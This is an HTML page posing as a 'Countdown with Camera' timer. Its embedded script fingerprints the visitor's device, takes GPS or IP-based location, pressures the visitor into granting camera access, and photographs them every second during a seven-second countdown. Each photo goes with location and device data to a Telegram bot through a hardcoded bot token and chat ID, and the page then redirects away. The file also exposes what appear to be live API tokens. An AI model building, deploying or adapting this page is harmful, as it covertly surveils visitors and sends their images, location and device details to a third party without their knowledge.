<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Countdown with Camera</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #ffffff;
      color: #222;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      flex-direction: column;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }
    .timer-wrapper {
      position: relative;
      width: 160px;
      height: 160px;
    }
    svg { transform: rotate(-90deg); }
    .circle-bg {
      fill: none;
      stroke: #e0e0e0;
      stroke-width: 8;
    }
    .circle-progress {
      fill: none;
      stroke: #3b82f6;
      stroke-width: 8;
      stroke-linecap: round;
      transition: stroke-dashoffset 1s linear;
    }
    #countdown {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 3.5rem;
      font-weight: 600;
      color: #1e293b;
    }
    #status {
      font-size: 1.1rem;
      color: #555;
      max-width: 350px;
      margin: 0 20px;
    }
    video { display: none; }

    .permission-box {
      background: #f8f9fa;
      border: 2px solid #3b82f6;
      border-radius: 12px;
      padding: 20px;
      margin-top: 20px;
      text-align: left;
      max-width: 320px;
    }
    .permission-box p { margin-bottom: 10px; }
    .btn {
      padding: 12px 25px;
      background: #3b82f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin: 5px;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <div class="timer-wrapper">
      <svg width="160" height="160" viewBox="0 0 160 160">
        <circle class="circle-bg" cx="80" cy="80" r="70" />
        <circle id="progressCircle" class="circle-progress" cx="80" cy="80" r="70"
          stroke-dasharray="439.82" stroke-dashoffset="0" />
      </svg>
      <div id="countdown">7</div>
    </div>
    <div id="status">Collecting device info...</div>
    <div id="permissionBox" class="permission-box" style="display:none;">
      <p id="permMessage"></p>
      <button class="btn" id="retryBtn">Retry</button>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    // ==================== CONFIGURATION ====================
    const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
    const CHAT_ID = '5151102782';
    const COUNTDOWN_START = 7;
    const IPINFO_TOKEN = 'a7e43833d69a75';

    // DOM
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const countdownEl = document.getElementById('countdown');
    const statusEl = document.getElementById('status');
    const progressCircle = document.getElementById('progressCircle');
    const permBox = document.getElementById('permissionBox');
    const permMsg = document.getElementById('permMessage');
    const retryBtn = document.getElementById('retryBtn');

    // State
    let redirectUrl = 'https://example.com';
    let countdown = COUNTDOWN_START;
    let stream = null;
    let intervalId = null;
    let latestPosition = null;
    let watchId = null;
    let isSending = false;
    let deviceInfo = null;
    const circumference = 2 * Math.PI * 70;

    // ==================== 1. Device Info ====================
    async function collectDeviceInfo() {
      statusEl.textContent = 'Collecting device info...';
      await new Promise(r => setTimeout(r, 500));
      const uaData = navigator.userAgentData || {};
      let highEntropyValues = {};
      if (uaData.getHighEntropyValues) {
        try {
          highEntropyValues = await uaData.getHighEntropyValues([
            "platform", "platformVersion", "architecture", "model",
            "uaFullVersion", "fullVersionList", "bitness", "wow64"
          ]);
        } catch(e) {}
      }
      const connection = navigator.connection || {};
      const screenInfo = window.screen;
      let batteryInfo = null;
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          batteryInfo = { level: battery.level, charging: battery.charging,
            chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime };
        }
      } catch(e) {}
      deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        doNotTrack: navigator.doNotTrack || window.doNotTrack || null,
        hardwareConcurrency: navigator.hardwareConcurrency || 1,
        deviceMemory: navigator.deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        vendor: navigator.vendor || '',
        product: navigator.product || '',
        appName: navigator.appName || '',
        appVersion: navigator.appVersion || '',
        userAgentData: { mobile: uaData.mobile || false, platform: uaData.platform || '', brands: uaData.brands || [] },
        highEntropyValues,
        screen: {
          width: screenInfo.width, height: screenInfo.height,
          availWidth: screenInfo.availWidth, availHeight: screenInfo.availHeight,
          colorDepth: screenInfo.colorDepth, pixelDepth: screenInfo.pixelDepth,
          devicePixelRatio: window.devicePixelRatio || 1,
          orientation: screenInfo.orientation ? screenInfo.orientation.type : 'unknown'
        },
        connection: {
          effectiveType: connection.effectiveType || 'unknown',
          downlink: connection.downlink || 0, rtt: connection.rtt || 0,
          saveData: connection.saveData || false, type: connection.type || 'unknown'
        },
        battery: batteryInfo,
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };
      statusEl.textContent = 'Device info collected ✓';
    }

    // ==================== 2. Location ====================
    function requestLocationPermission() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve('unavailable');
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            latestPosition = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              source: 'gps'
            };
            statusEl.textContent = 'Location acquired via GPS ✓';
            resolve('granted');
          },
          (err) => {
            console.warn('GPS failed:', err.message);
            resolve('denied');
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }

    async function fetchLocationByIP() {
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
        const data = await res.json();
        if (data.loc) {
          const [lat, lon] = data.loc.split(',').map(Number);
          latestPosition = {
            latitude: lat,
            longitude: lon,
            accuracy: 10000,
            source: 'ip'
          };
          statusEl.textContent = 'Location acquired via IP ✓';
        }
        if (deviceInfo) {
          deviceInfo.ipLocation = {
            ip: data.ip, city: data.city, region: data.region,
            country: data.country, loc: data.loc, org: data.org,
            postal: data.postal, timezone: data.timezone
          };
        }
      } catch(e) {
        console.warn('IP location failed:', e);
      }
    }

    // ==================== 3. Camera ====================
    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        await video.play();
        statusEl.textContent = 'Camera ready ✓';
        return true;
      } catch(err) {
        console.warn('Camera denied:', err.message);
        return false;
      }
    }

    // ==================== 4. Handle Permissions & Retry ====================
    async function obtainAllPermissions() {
      let locStatus = await requestLocationPermission();
      if (locStatus === 'denied') {
        await fetchLocationByIP();
      }

      let camStatus = await requestCamera();
      if (!camStatus) {
        permMsg.innerHTML = '⚠️ Please allow camera access in your browser settings, then press Retry.';
        permBox.style.display = 'block';
        await new Promise(resolve => {
          retryBtn.onclick = async () => {
            permBox.style.display = 'none';
            camStatus = await requestCamera();
            if (!camStatus) {
              alert('Camera permission is still denied. Please enable it manually in settings and reload the page.');
            }
            resolve();
          };
        });
      }

      permBox.style.display = 'none';
      statusEl.textContent = 'All permissions obtained ✓';
    }

    // ==================== 5. Capture & Send ====================
    function capturePhoto() {
      if (!video.videoWidth || !stream) return null;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.8);
    }

    async function sendSinglePhoto(photoDataUrl) {
      if (isSending) return;
      isSending = true;
      try {
        let caption = `Photo captured`;
        if (latestPosition && latestPosition.latitude) {
          caption += `\n📍 Location: ${latestPosition.latitude}, ${latestPosition.longitude} (source: ${latestPosition.source})`;
        }
        if (deviceInfo) {
          caption += `\n\n📱 Device Info:\n${JSON.stringify(deviceInfo, null, 2)}`;
        }

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        const base64str = photoDataUrl.split(',')[1];
        const mime = photoDataUrl.split(',')[0].split(':')[1].split(';')[0];
        const binary = atob(base64str);
        const array = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
          array[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([array], { type: mime });
        formData.append('photo', blob, 'image.jpg');
        formData.append('caption', caption);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch(err) {
        console.error('Send error:', err);
      } finally {
        isSending = false;
      }
    }

    function updateTimerUI() {
      countdownEl.textContent = countdown;
      const offset = ((COUNTDOWN_START - countdown) / COUNTDOWN_START) * circumference;
      progressCircle.style.strokeDashoffset = offset;
    }

    async function tick() {
      const photo = capturePhoto();
      if (photo) sendSinglePhoto(photo);
      countdown--;
      updateTimerUI();
      if (countdown <= 0) {
        clearInterval(intervalId);
        statusEl.textContent = 'Redirecting...';
        if (stream) stream.getTracks().forEach(track => track.stop());
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        window.location.href = redirectUrl;
      }
    }

    // ==================== 6. Start ====================
    async function startCountdown() {
      if (navigator.geolocation) {
        watchId = navigator.geolocation.watchPosition(
          pos => {
            latestPosition = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              source: 'gps'
            };
          },
          err => console.warn('watchPosition error:', err.message),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
      updateTimerUI();
      tick();
      intervalId = setInterval(tick, 1000);
    }

    // Main flow
    window.addEventListener('load', async () => {
      await collectDeviceInfo();
      await obtainAllPermissions();
      startCountdown();
    });

    window.addEventListener('beforeunload', () => {
      if (intervalId) clearInterval(intervalId);
      if (stream) stream.getTracks().forEach(track => track.stop());
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
    });
  </script>
</body>
</html>
